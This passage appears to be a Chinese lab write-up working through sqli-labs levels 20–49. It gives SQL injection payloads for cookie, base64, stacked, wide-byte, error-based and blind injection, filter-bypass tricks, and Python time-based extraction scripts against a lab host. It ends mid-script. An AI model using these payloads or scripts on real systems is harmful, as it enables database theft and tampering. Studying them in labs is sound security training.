<p>登录成功并且记录了cookie</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221628397.png" alt="image-20220722162847338"></p>
<p>发现修改cookie的值就能实现任意账号登录</p>
<p>我们可以把cookie当作一个输入账号的地址。cookie很明显会与数据库进行交互我们找闭合符就好了.</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221632122.png" alt="image-20220722163215067"></p>
<p>使用admin\成功发现闭合符号为’</p>
<p><strong>字段数</strong>：admin1’ order by 3 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221633507.png" alt="image-20220722163306456"></p>
<p><strong>爆数据库名：</strong>-1’ union select database(),2,3#</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221634429.png" alt="image-20220722163432369"></p>
<p><strong>数据库版本：</strong>-1’ union select version(),2,3 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221635924.png" alt="image-20220722163536870"></p>
<p><strong>表名</strong>：-1’ union select (select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),2,3 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221638518.png" alt="image-20220722163825462"></p>
<p><strong>字段名：</strong>-1’ union select (select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘users’),2,3 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221640489.png" alt="image-20220722164007431"></p>
<p><strong>账号密码：</strong>uname&#x3D;-1’ union select group_concat(username),group_concat(password),2 from users#</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221644313.png" alt="image-20220722164440259"></p>
<h4 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h4><p>访问页面</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221645678.png" alt="image-20220722164521615"></p>
<p>输入正确的账号和密码后发现还是cookie注入</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221646563.png" alt="image-20220722164604500"></p>
<p>burp看数据包</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221646086.png" alt="image-20220722164653032"></p>
<p>发现cookie进行了加密，一开始看见百分号以为是url编码，后面又试了一下是base64</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221649996.png" alt="image-20220722164909952"></p>
<p>将admin\进行base64编码再替换cookie值</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221658690.png" alt="image-20220722165804641"></p>
<p>发现闭合符为’)</p>
<p>接下来构造payload即可</p>
<p><strong>数据库：</strong> -1’)  union select 1,2,database()  #</p>
<p>**base64:**LTEnKSAgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICAj</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221659378.png" alt="image-20220722165929318"></p>
<p>后面的也同样是替换base64</p>
<p><strong>Less-22</strong></p>
<p>访问页面输入账号和密码后，发现页面提示了cookie</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221704580.png" alt="image-20220722170453522"></p>
<p>直接用浏览器登录刷新后获取到了cookie</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221706149.png" alt="image-20220722170621102"></p>
<p>cookie处还是用了base64进行加密</p>
<p>还是用admin\转换程base64判断闭合符</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221708132.png" alt="image-20220722170853082"></p>
<p>如上图，闭合符为”,接下来继续构造payload</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221710977.png" alt="image-20220722171038924"></p>
<p><strong>数据库;</strong>-1” union select database(),2,3 #</p>
<p>**base64:**LTEiIHVuaW9uIHNlbGVjdCBkYXRhYmFzZSgpLDIsMyAj</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221711150.png" alt="image-20220722171117101"></p>
<p>后面的也是base64替换即可，就不做了。</p>
<h2 id="项目二-Stacked-Injections"><a href="#项目二-Stacked-Injections" class="headerlink" title="项目二(Stacked Injections)"></a>项目二(Stacked Injections)</h2><h4 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h4><p>访问页面后提示输入id值进行传参</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221713320.png" alt="image-20220722171340258"></p>
<p>输入参数后直接就显示了账号和密码</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221715008.png" alt="image-20220722171507951"></p>
<p>输入\判断闭合符</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221717467.png" alt="image-20220722171729425"></p>
<p>如上图，闭合符为’</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261447581.png" alt="image-20220726144729469"></p>
<p>但还是报错了，看了源码发现注释符被过滤了，所以我们应该把后面的也进行一个闭合</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261452972.png" alt="image-20220726145225916"></p>
<p>成功回显</p>
<p><strong>爆数据库</strong>：-1’ union select 1,2,database() ‘</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261458711.png" alt="image-20220726145839649"></p>
<p><strong>爆数据库版本：</strong>id&#x3D;-1’ union select 1,2,version() ‘</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261515903.png" alt="image-20220726151550813"></p>
<p>后面的就不一一列举了</p>
<h4 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h4><p>访问页面</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261516939.png" alt="image-20220726151624886"></p>
<p>是一个登录页面，我们输入一个正确的账号密码试试水</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261517369.png" alt="image-20220726151725311"></p>
<p>登进去了，我们也可以修改密码</p>
<p>也可以注册新用户，但忘记密码这个功能用不了</p>
<p>看了半天，一以为是新用户注册那注册用户然后进行登录比如adm’ order by 3 #这样的用户在登录时会出现回显那种。</p>
<p>看了网上wp后，明白了原来是二次注入的方式修改admin的密码</p>
<h4 id="Less-25a："><a href="#Less-25a：" class="headerlink" title="Less-25a："></a><strong>Less-25a</strong>：</h4><p>准备查看26关源码时以为的发现居然有25a的源码，还好发现了不然这关没了</p>
<p>访问页面：</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261546235.png" alt="image-20220726154637167"></p>
<p>页面提示了会过滤掉一些关键字，下面也会输出没过滤掉的内容</p>
<p><strong>爆字段数：</strong>id&#x3D;1 oorrder by 3 –+</p>
<p>用oorr双写过滤掉了or</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261608720.png" alt="image-20220726160834648"></p>
<p><strong>爆数据库</strong>：-1 union select 1,2,database() –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261612459.png" alt="image-20220726161214382"></p>
<p><strong>表名：</strong>id&#x3D;-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database()) –+</p>
<p>这表爆半天，命令啥的都没问题可就是不出表名，结果看别人wp发现information这个语句过滤掉了or。T_T，居然没发现</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261654252.png" alt="image-20220726165405154"></p>
<p><strong>爆字段：</strong>id&#x3D;-1 union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;’users’  aandnd table_schema&#x3D;database()) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261712876.png" alt="image-20220726171229836"></p>
<p>爆账号和密码：id&#x3D;-1 union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261725521.png" alt="image-20220726172501461"></p>
<h4 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h4><p>这关主要是过滤了空格，看了网上的wp很多多是用报错注入实现的，但很久没用python来写exp了，所以我们这边使用盲注来写exp</p>
<p><strong>爆数据库：</strong>   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload, args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t2 = threading.Thread(target=controller, args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>, <span class="number">127</span>):</span><br><span class="line">                a = <span class="string">&#x27;&quot;)&#x27;</span></span><br><span class="line">                payload = <span class="string">f&quot;-1&#x27;XOorR(if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)) oorr&#x27;&quot;</span></span><br><span class="line">                dic = &#123;<span class="string">&quot;search&quot;</span>: <span class="built_in">chr</span>(j), <span class="string">&quot;payload&quot;</span>: payload&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">controller</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">dic</span>):</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://101.35.96.6:8000/Less-26/?id=&quot;</span> + dic[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;rlvk21bo492d5t2amm9p7i2o65&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,zh-HK;q=0.5&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    requests.get(url=url, headers=headers, data=dic[<span class="string">&quot;payload&quot;</span>],cookies=cookies)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    <span class="keyword">if</span> t_time2 - t_time1 &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(dic[<span class="string">&quot;search&quot;</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207271837526.png" alt="image-20220727183720410">                                </p>
<p>后面的就不列举了，照着套就行</p>
<h4 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h4><p>用25关exp改个url就行了</p>
<h4 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h4><p>这题和前面题都差不多，而且这题就过滤了空格，and和or都没过滤掉，盲注和报错注入都可以用，我们这边使用报错注入简单一点。</p>
<p><strong>爆数据库名</strong>：1’and((updatexml(1,concat(0x7e,(select database()),0x7e),1)))or’<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291522609.png" alt="image-20220729152211482"></p>
<p><strong>爆数据库版本</strong>：1’and((updatexml(1,concat(0x7e,(select version()),0x7e),1)))or’</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291522071.png" alt="image-20220729152247977"></p>
<p><strong>爆表名</strong>:1’and((updatexml(1,concat(0x7e,(selEct%a0 group_concat(table_name)%a0from%a0  information_schema.tables%a0where%a0table_schema &#x3D; database()),0x7e),1)))or’</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291610036.png" alt="image-20220729161019956"></p>
<p>后面的照着套就行</p>
<h4 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h4><p>这题把报错给屏蔽了</p>
<p>可以用盲注来做，或者回显明注</p>
<p>这里我们使用回显明注</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291735128.png" alt="image-20220729173524049"></p>
<p>过滤了union和select不过双写或者大小写就能绕过</p>
<p>再用%a0替换空格即可</p>
<h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><p>这题主要过滤了union select</p>
<p>一开始以为是’闭合试了半天都找不到出错原因，我主要是对and构造真假了辨别</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291758227.png" alt="image-20220729175830132"></p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291758810.png" alt="image-20220729175849726"></p>
<p>用回显注，结果怎么试都不对，</p>
<p>看了源码才知道是闭合符是‘)，但匪夷所思的是可以用’来做盲注是行的通的，原理暂时不知道。。</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291855520.png" alt="image-20220729185512434"></p>
<p><strong>爆数据库：</strong>?id&#x3D;k’)%0aunion%a0selEct%0a1,database(),3%0aor(‘</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291857645.png" alt="image-20220729185746552"></p>
<h4 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h4><p>这题和28关一样</p>
<p><strong>爆数据库</strong>：id&#x3D;k’) union%a0select 1,database(),1  or (‘</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311321659.png" alt="image-20220731132126502"></p>
<h4 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h4><p>这题用\知道了闭合符为’</p>
<p>主要是把下方的回显都弄成url编码了，不过问题不大</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311327655.png" alt="image-20220731132729583"></p>
<p><strong>爆当前数据库</strong>：id&#x3D;k’ union select 1,2,database() –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311328242.png" alt="image-20220731132853164"></p>
<p><strong>爆所有数据库：</strong>k’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311331544.png" alt="image-20220731133110462"></p>
<p><strong>爆表名：</strong><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311332986.png" alt="image-20220731133218920"></p>
<p><strong>爆字段名</strong>：k’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311333607.png" alt="image-20220731133329540"></p>
<p><strong>爆账号密码：</strong>id&#x3D;<br>k’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311341184.png" alt="image-20220731134137101"></p>
<h4 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h4><p>这题和29题一样改个闭合符就行了</p>
<p>注释符为”</p>
<h4 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h4><p>老样子使用\判断注释符</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311412701.png" alt="image-20220731141226647"></p>
<p>闭合符为”)</p>
<p>这题也和29题一样，改个闭合符就行</p>
<h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p>这题主要是对特殊字符进行了转义,不过可以进行宽字节注入</p>
<p>使用%df%27即可逃逸gpc</p>
<p>通过%df%27对转义字符进行二次转义得到  X‘进行闭合</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311658528.png" alt="image-20220731165854445"></p>
<p><strong>字段数</strong>：1%df%27 order by 3–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311700628.png" alt="image-20220731170017559"></p>
<p><strong>爆数据库</strong>：%df%27 union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311702176.png" alt="image-20220731170206121"></p>
<p><strong>爆表名：</strong>%df%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311703150.png" alt="image-20220731170324085"></p>
<p><strong>爆字段名：</strong>%df%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; 0x7573657273–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311709941.png" alt="image-20220731170913880"></p>
<p><strong>爆账号和密码</strong>：%df%27 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311711157.png" alt="image-20220731171133089"></p>
<h4 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h4><p>这关和上一关一样</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021053920.png" alt="image-20220802105301812"></p>
<p>就不再演示了</p>
<h4 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h4><p>这关又来到了post注入</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021053780.png" alt="image-20220802105350712"></p>
<p>这一关用不了url过滤，不过直接用%aa转义后的字符直接添加进去也可以爆出数据</p>
<p><strong>爆数据库：</strong>uname&#x3D;�’ union select 1,group_concat(schema_name) from information_schema.schemata–+&amp;passwd&#x3D;1</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021208055.png" alt="image-20220802120851991"></p>
<p><strong>爆表名</strong>：uname&#x3D;�’ union select 1,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()–+&amp;passwd&#x3D;1</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021210766.png" alt="image-20220802121011702"></p>
<p>剩下的就不一一演示了，直接套就行</p>
<h4 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h4><p>这题我弄了半天闭合符，看了源码才知道没闭合，而且这字符串转义，被这题虚晃一枪了</p>
<p>直接用最简单的sql注入就行</p>
<p><strong>爆数据库</strong>：-1 union select 1,database(),3 –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021329648.png" alt="image-20220802132952581"></p>
<h4 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h4><p>这题同样是宽字节注入，闭合符为’</p>
<p><strong>爆数据库：</strong>%df%27 union select 1,group_concat(schema_name),3 from information_schema.schemata –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021335685.png" alt="image-20220802133553617"></p>
<h4 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h4><p>这题和上一题一一样，只是把get注入换成了post注入</p>
<p><strong>爆表名</strong>：uname&#x3D;admin�’ union select 1,group_concat(schema_name) from information_schema.schemata #&amp;passwd&#x3D;admin</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021338965.png" alt="image-20220802133842886"></p>
<h2 id="项目三-Stacked-Injections"><a href="#项目三-Stacked-Injections" class="headerlink" title="项目三(Stacked Injections)"></a>项目三(Stacked Injections)</h2><h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>这题用\找出闭合符为’后，直接构造payload就行</p>
<p><strong>爆数据库</strong>：-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021342583.png" alt="image-20220802134222519"></p>
<p>当然这关是堆叠注入的主要考堆叠注入，所以我们还是使用堆叠来做</p>
<p>这题判断出闭合符后再插入数据即可</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031527459.png" alt="image-20220803152711326"></p>
<p>访问看看</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031527308.png" alt="image-20220803152758245"></p>
<h4 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h4><p>这题和38题一样，不过没闭合符</p>
<p><strong>爆数据库</strong>：-1 union select 1,2,group_concat(schema_name) from information_schema.schemata  –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021344131.png" alt="image-20220802134458060"></p>
<h4 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h4><p>这题没报错信息，手工判断的闭合符为‘）</p>
<p>除闭合符外，其他的也和38题一样</p>
<p><strong>爆数据库：</strong>-1’) union select 1,2,group_concat(schema_name) from information_schema.schemata  –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021353925.png" alt="image-20220802135330855"></p>
<h4 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h4><p>这题和38题一模一样只是没了报错信息</p>
<p><strong>爆表名</strong>：-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; database() –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021356790.png" alt="image-20220802135639721"></p>
<h4 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h4><p>这题同样是堆叠注入，但从get改成了post方式</p>
<p>这题我用户名试了半天闭合符，看了源码发现突破点在密码。。。</p>
<p>试出闭合符后再插入数据即可</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031553115.png" alt="image-20220803155357052"></p>
<p>成功注入</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031553890.png" alt="image-20220803155322816"></p>
<h4 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h4><p>这题和42题一样，只是改了注释符，注释符为‘）</p>
<p>admin’);insert into users values(40,’less44’,’less44’)#</p>
<h4 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h4><p>admin’;insert into users values(40,’less44’,’less44’)#</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031604495.png" alt="image-20220803160457433"></p>
<h4 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h4><p>admin’);insert into users values(45,’Less45’,’Less45’)#</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031608271.png" alt="image-20220803160802189"></p>
<h4 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h4><p>这题改变了以前的传输名，返回的也是表格，所以我们不能利用数据回显的位置，但可以使用盲注和报错注入</p>
<p><strong>表名</strong>：1 AND updatexml(1,concat(“<del>“,database(),”</del>“),2)#</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031622237.png" alt="image-20220803162218188"></p>
<h4 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h4><p>这一关闭合符为’，其他的和46关一致</p>
<h4 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h4><p>这一关不管输什么闭合符都无回显，所以初步判定为数值盲注</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url=&quot;http://101.35.96.6:8000/Less-48/?sort=&quot;</span><br><span class="line"></span><br><span class="line">database=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,9):</span><br><span class="line">    min = 32</span><br><span class="line">    max = 127</span><br><span class="line">    while min&lt;max:</span><br><span class="line">        mid=(min+max)//2</span><br><span class="line">        payload=f&quot;1 and if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)--+&quot;</span><br><span class="line">        time_1 = time.time()</span><br><span class="line">        response=requests.get(url=url+payload)</span><br><span class="line">        time_2 = time.time()</span><br><span class="line">        if time_2 - time_1 &gt; 3:</span><br><span class="line">            min =mid+1</span><br><span class="line">        else:</span><br><span class="line">            max=mid</span><br><span class="line">    if min !=32 :</span><br><span class="line">        database+=chr(min)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(database)</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208041719972.png" alt="image-20220804171952852"></p>
<h4 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h4><p>这题输’无回显，但输其他的都能正常回显，所以初步判定’为闭合符</p>
<p>这题我们同样使用盲注</p>
<p><strong>爆数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 